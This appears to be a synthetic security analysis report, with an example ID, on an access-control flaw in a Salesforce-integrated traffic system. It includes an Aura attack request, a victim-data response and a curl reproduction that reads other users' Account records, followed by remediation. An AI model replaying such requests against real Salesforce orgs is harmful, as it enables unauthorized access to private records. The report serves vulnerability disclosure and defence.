# Security Analysis Report
**System:** MetroPulse Traffic Orchestration (Salesforce-Integrated)
**Domain:** Smart City / Traffic Management
**Example ID:** SF-0054
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `AccountController.getAccounts` — attacker reads any traffic Account record without server-side ownership verification |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Account Object (Pattern 3.1)

### Summary
The Apex controller `AccountController` on MetroPulse Traffic Orchestration (`8e395709.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Account object. Per §5.0 Pattern 3.1, the system assumes the client will only supply accountIds it legitimately owns (client-assumed authority). No server-side ownership or tenancy check is enforced, allowing the attacker to read any victim Account record by substituting `accountId`.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getAccountDetails(String accountId, ...)` while the Aura descriptor in §6.0 is `c.AccountController.getAccounts`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://8e395709.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://8e395709.lightning.force.com/aura
Authorization: Bearer 00D8E395709!AR8e395709...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D8E395709!AR8e395709...

message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN",
"params":{"accountId":"0015709","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Account Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0015709", "Name": "Victim Account Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-67-1571"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D8E395709!AR8e395709..."
curl -s -X POST "https://8e395709.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"0015709","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-67-1571
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class AccountController { ... }`
2. `WHERE Id = :accountId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. Do not trust client-supplied `accountId` — always verify ownership server-side.
